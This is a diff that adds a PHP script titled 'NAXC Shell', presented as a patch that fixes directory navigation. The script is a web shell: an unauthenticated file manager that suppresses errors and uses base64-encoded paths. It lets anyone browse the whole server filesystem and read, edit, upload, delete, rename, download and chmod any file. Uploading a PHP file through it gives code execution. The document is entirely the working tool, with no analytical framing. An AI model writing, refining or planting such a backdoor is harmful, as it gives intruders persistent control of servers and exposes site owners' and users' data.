@@ -1,0 +1,499 @@
+<?php
+/**
+ * NAXC.PHP — Fix directory navigation
+ *
+ * Changes in this patch:
+ * - Accept directory parameter from GET as well as POST so navigation works reliably.
+ * - goDir() now navigates via GET (location.href) which is simpler and avoids any POST/redirect interference.
+ * - redirect() preserves current directory by default so after actions you stay in the same folder.
+ * - Minor safety and path normalization improvements.
+ *
+ * Behaviour remains the same for edit/download/delete/rename/upload tools.
+ */
+
+error_reporting(0);
+@set_time_limit(0);
+@ini_set('display_errors', 0);
+
+session_start();
+
+/* ============================================================
+   BASIC ENV SETUP
+============================================================ */
+
+define('SELF', basename(__FILE__));
+define('ROOT', str_replace('\\', '/', getcwd()));
+
+/*
+ * Accept `d` (base64-encoded path) from either GET or POST.
+ * Using GET for navigation (goDir will now do a GET). POST is still supported
+ * for form-based actions like upload/rename/save/delete/download.
+ */
+$raw_d = null;
+if (isset($_GET['d'])) {
+    $raw_d = $_GET['d'];
+} elseif (isset($_POST['d'])) {
+    $raw_d = $_POST['d'];
+}
+
+$cwd = ROOT;
+if (!empty($raw_d)) {
+    // raw_d is expected base64 encoded string
+    $decoded = base64_decode($raw_d, true);
+    if ($decoded !== false && $decoded !== '') {
+        // realpath might return false for non-existing paths; keep decoded if realpath fails
+        $real = realpath($decoded);
+        $cwd = $real !== false ? str_replace('\\', '/', $real) : str_replace('\\', '/', $decoded);
+    }
+}
+$cwd = rtrim($cwd, '/');
+if ($cwd === '') $cwd = '/';
+
+/* ============================================================
+   HELPERS
+============================================================ */
+
+function h($str) {
+    return htmlspecialchars($str, ENT_QUOTES);
+}
+
+function b64e($v) {
+    return base64_encode($v);
+}
+
+function b64d($v) {
+    return base64_decode($v);
+}
+
+/**
+ * Redirect to SELF and preserve current directory ($cwd) so after actions
+ * user stays in the same folder.
+ */
+function redirect($cwd = null) {
+    $url = SELF;
+    if ($cwd !== null) {
+        $url .= '?d=' . urlencode(b64e($cwd));
+    } else {
+        global $cwd;
+        $url .= '?d=' . urlencode(b64e($cwd));
+    }
+    header("Location: " . $url);
+    exit;
+}
+
+function alert($msg, $type) {
+    $_SESSION['alert_type'] = $type;
+    $_SESSION['alert'] = $msg;
+}
+
+function flash() {
+    if (!empty($_SESSION['alert'])) {
+        if ($_SESSION['alert_type'] === 'success') {
+            $color = '#0f0';
+        } elseif ($_SESSION['alert_type'] === 'error') {
+            $color = '#f00';
+        } else {
+            $color = '#ff0';
+        }
+        echo '<div style="padding:10px;border:1px solid ' . $color . ';color:' . $color . ';margin-bottom:10px;">'
+            . h($_SESSION['alert']) . '</div>';
+        unset($_SESSION['alert']);
+        unset($_SESSION['alert_type']);
+    }
+}
+
+/* ============================================================
+   FILE OPERATIONS
+============================================================ */
+
+function uploadFile($dir) {
+    if (!isset($_FILES['file'])) return;
+
+    $target = rtrim($dir, '/\\') . '/' . basename($_FILES['file']['name']);
+    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        alert('Upload success', 'success');
+    } else {
+        alert('Upload failed', 'error');
+    }
+}
+
+function deleteFile($path) {
+    if (@unlink($path)) {
+        alert('Delete success', 'success');
+    } else {
+        alert('Delete failed', 'error');
+    }
+}
+
+function renameFile($old, $new) {
+    $newPath = dirname($old) . '/' . $new;
+    if (@rename($old, $newPath)) {
+        alert('Rename success', 'success');
+    } else {
+        alert('Rename failed', 'error');
+    }
+}
+
+function chmodFile($path, $perm) {
+    if (@chmod($path, $perm)) {
+        alert('Chmod success', 'success');
+    } else {
+        alert('Chmod failed', 'error');
+    }
+}
+
+function saveFile($path, $content) {
+    if (file_put_contents($path, $content) !== false) {
+        alert('File saved', 'success');
+    } else {
+        alert('Save failed', 'error');
+    }
+}
+
+/* ============================================================
+   ACTION ROUTER
+   (POST actions only; navigation is via GET)
+============================================================ */
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Upload
+    if (isset($_POST['upload'])) {
+        uploadFile($cwd);
+        redirect($cwd);
+    }
+
+    // Delete (expects base64 encoded value)
+    if (isset($_POST['delete'])) {
+        $value = b64d($_POST['delete']);
+        deleteFile($value);
+        redirect($cwd);
+    }
+
+    // Rename (rename form posts rename + newname)
+    if (isset($_POST['rename']) && isset($_POST['newname'])) {
+        $old = b64d($_POST['rename']);
+        $new = $_POST['newname'];
+        renameFile($old, $new);
+        redirect($cwd);
+    }
+
+    // Chmod (changin file permission)
+    if (isset($_POST['newperm'])) {
+        $file = b64d($_POST['chmod']);
+        $perm = intval($_POST['newperm'], 8); // interpret as octal
+        chmodFile($file, $perm);
+        redirect($cwd);
+    }
+
+    // Save edit
+    if (isset($_POST['save']) && isset($_POST['file'])) {
+        $file = b64d($_POST['file']);
+        $content = isset($_POST['content']) ? $_POST['content'] : '';
+        saveFile($file, $content);
+        redirect($cwd);
+    }
+
+    // Download handled later because it sends headers + exits
+}
+
+/* ============================================================
+   DIRECTORY HELPERS
+============================================================ */
+
+function formatSize($bytes) {
+    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
+    if ($bytes >= 1048576)    return round($bytes / 1048576, 2) . ' MB';
+    if ($bytes >= 1024)       return round($bytes / 1024, 2) . ' KB';
+    return $bytes . ' B';
+}
+
+function perms($file) {
+    $perms = @fileperms($file);
+    if ($perms === false) return '---------';
+
+    $info = ($perms & 0x4000) ? 'd' : '-';
+    $info .= ($perms & 0x0100) ? 'r' : '-';
+    $info .= ($perms & 0x0080) ? 'w' : '-';
+    $info .= ($perms & 0x0040) ? 'x' : '-';
+    $info .= ($perms & 0x0020) ? 'r' : '-';
+    $info .= ($perms & 0x0010) ? 'w' : '-';
+    $info .= ($perms & 0x0008) ? 'x' : '-';
+    $info .= ($perms & 0x0004) ? 'r' : '-';
+    $info .= ($perms & 0x0002) ? 'w' : '-';
+    $info .= ($perms & 0x0001) ? 'x' : '-';
+
+    return $info;
+}
+
+function breadcrumb($path) {
+    $parts = explode('/', trim($path, '/'));
+    $build = '';
+    echo '<div style="margin:10px 0;">';
+    // root link: uses GET navigation
+    echo '<a href="' . SELF . '?d=' . urlencode(b64e('/')) . '">/</a>';
+
+    foreach ($parts as $p) {
+        if ($p === '') continue;
+        $build .= '/' . $p;
+        echo ' / <a href="' . SELF . '?d=' . urlencode(b64e($build)) . '">' . h($p) . '</a>';
+    }
+    echo '</div>';
+}
+
+/* ============================================================
+   DIRECTORY LISTING
+============================================================ */
+
+$items = @scandir($cwd);
+$dirs  = [];
+$files = [];
+
+if ($items) {
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+
+        $full = $cwd . '/' . $item;
+        if (is_dir($full)) {
+            $dirs[] = $item;
+        } else {
+            $files[] = $item;
+        }
+    }
+}
+
+/* ============================================================
+   UI: HEADER + BREADCRUMB
+============================================================ */
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>NAXC Shell</title>
+<style>
+body{background:#0e0e0e;color:#ddd;font-family:monospace}
+a{color:#5bc0ff;text-decoration:none}
+table{width:100%;border-collapse:collapse;margin-top:10px}
+th,td{padding:6px;border-bottom:1px solid #222}
+th{text-align:left;color:#aaa}
+tr:hover{background:#151515}
+input,textarea,button{background:#111;color:#eee;border:1px solid #333;padding:5px}
+button{cursor:pointer}
+</style>
+
+<script>
+/**
+ * base64EncodeUnicode: UTF-8 safe base64
+ */
+function base64EncodeUnicode(str) {
+    try {
+        return btoa(unescape(encodeURIComponent(str)));
+    } catch (e) {
+        try { return btoa(str); } catch (e2) { return ''; }
+    }
+}
+
+/**
+ * goDir: navigate using GET with base64-encoded path in `d` param.
+ * This is simpler and ensures navigation works reliably across browsers,
+ * avoids issues with POST handling and redirects.
+ */
+function goDir(d) {
+    const encoded = base64EncodeUnicode(d);
+    // use location.href to navigate with GET
+    location.href = '<?= SELF ?>?d=' + encodeURIComponent(encoded);
+}
+
+/**
+ * act: generic POST for edit/download/delete/rename actions
+ * (these need to be POST to allow download and file modifications)
+ */
+function act(name, val) {
+    // create and submit a POST form
+    const f = document.createElement('form');
+    f.method = 'post';
+    f.style.display = 'none';
+
+    const i = document.createElement('input');
+    i.type = 'hidden';
+    i.name = name;
+    i.value = base64EncodeUnicode(val);
+    f.appendChild(i);
+
+    document.body.appendChild(f);
+    f.submit();
+}
+</script>
+</head>
+<body>
+
+<?php flash(); ?>
+
+<h2>NAXC File Manager</h2>
+<div>Home: <a href="<?php echo basename($_SERVER['PHP_SELF']); ?>" style="color:#ddd;"><?= h(getcwd()) ?></a></div>
+
+<?php breadcrumb($cwd); ?>
+
+<?php
+/* ============================================================
+   DOWNLOAD HANDLER
+   (must be after the listing so we can capture POST actions)
+============================================================ */
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download'])) {
+    $file = b64d($_POST['download']);
+
+    if (!is_file($file) || !file_exists($file)) {
+        alert('File not found', 'error');
+        redirect($cwd);
+    }
+
+    if (ob_get_level()) {
+        ob_end_clean();
+    }
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Content-Length: '.filesize($file));
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Expires: 0');
+
+    readfile($file);
+    exit;
+}
+
+/* ============================================================
+   EDITOR UI
+============================================================ */
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit'])):
+    $file = b64d($_POST['edit']);
+    if (!is_file($file)) {
+        alert('File not editable', 'error');
+        redirect($cwd);
+    }
+?>
+<hr>
+<h3>Editing: <?= h(basename($file)) ?></h3>
+
+<form method="post">
+    <textarea name="content" style="width:100%;height:350px"><?php
+        echo h(file_get_contents($file));
+    ?></textarea>
+
+    <input type="hidden" name="file" value="<?= b64e($file) ?>">
+    <br><br>
+    <button type="submit" name="save">Save</button>
+    <button type="button" onclick="goDir(<?= json_encode(dirname($file)) ?>)">Cancel</button>
+</form>
+<hr>
+<?php endif; ?>
+
+<?php
+/* ============================================================
+   RENAME UI
+============================================================ */
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename']) && !isset($_POST['newname'])):
+    $file = b64d($_POST['rename']);
+?>
+<hr>
+<h3>Rename: <?= h(basename($file)) ?></h3>
+
+<form method="post">
+    <input type="text" name="newname" value="<?= h(basename($file)) ?>">
+    <input type="hidden" name="rename" value="<?= b64e($file) ?>">
+    <br><br>
+    <button type="submit">Rename</button>
+    <button type="button" onclick="goDir(<?= json_encode(dirname($file)) ?>)">Cancel</button>
+</form>
+<hr>
+<?php endif; ?>
+
+<?php
+/* ============================================================
+   CHMOD UI
+============================================================ */
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod']) && !isset($_POST['perm'])):
+    $file = b64d($_POST['chmod']);
+    $currentPerms = substr(sprintf('%o', fileperms($file)), -3);
+?>
+<hr>
+<h3>Chmod: <?= h(basename($file)) ?></h3>
+
+<form method="post">
+    <input type="hidden" name="chmod" value="<?= b64e($file) ?>">
+    <input type="number" name="newperm" value="<?= $currentPerms ?>">
+    <br><br>
+    <button type="submit">Change Permissions</button>
+    <button type="button" onclick="goDir(<?= json_encode(dirname($file)) ?>)">Cancel</button>
+</form>
+<?php endif; ?>
+
+<?php
+/* ============================================================
+   UPLOAD UI
+============================================================ */
+?>
+
+<hr>
+<h3>Upload File</h3>
+<form method="post" enctype="multipart/form-data">
+    <input type="file" name="file">
+    <!-- keep hidden d so server knows where to upload -->
+    <input type="hidden" name="d" value="<?= b64e($cwd) ?>">
+    <button type="submit" name="upload">Upload</button>
+</form>
+<hr>
+
+<table>
+<tr>
+    <th>Name</th>
+    <th>Size</th>
+    <th>Perms</th>
+    <th>Action</th>
+</tr>
+
+<?php foreach ($dirs as $d): ?>
+<tr>
+    <td>
+        📁 <a href="javascript:void(0)" onclick='goDir(<?= json_encode($cwd . "/" . $d) ?>)'><?= h($d) ?></a>
+    </td>
+    <td>—</td>
+    <td>
+        <font color="<?= is_writable($cwd . '/' . $d) ? '#0f0' : '#f00' ?>">
+            <?= perms($cwd . '/' . $d) ?>
+        </font>
+    </td>
+    <td>—</td>
+</tr>
+<?php endforeach; ?>
+
+<?php foreach ($files as $f):
+    $full = $cwd . '/' . $f;
+?>
+<tr>
+    <td>📄 <?= h($f) ?></td>
+    <td><?= formatSize(@filesize($full)) ?></td>
+    <td>
+        <font color="<?= is_writable($full) ? '#0f0' : '#f00' ?>">
+            <?= perms($full) ?>
+        </font>
+    </td>
+    <td>
+        <a href="#" onclick="act('edit', <?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>); return false;">Edit</a> |
+        <a href="#" onclick="act('rename', <?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>); return false;">Rename</a> |
+        <a href="#" onclick="act('chmod', <?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>); return false;">Chmod</a> |
+        <a href="#" onclick="act('download', <?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>); return false;">Download</a> |
+        <a href="#" onclick="act('delete', <?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>); return false;">Delete</a>
+    </td>
+</tr>
+<?php endforeach; ?>
+
+</table>
+
+</body>
+</html>
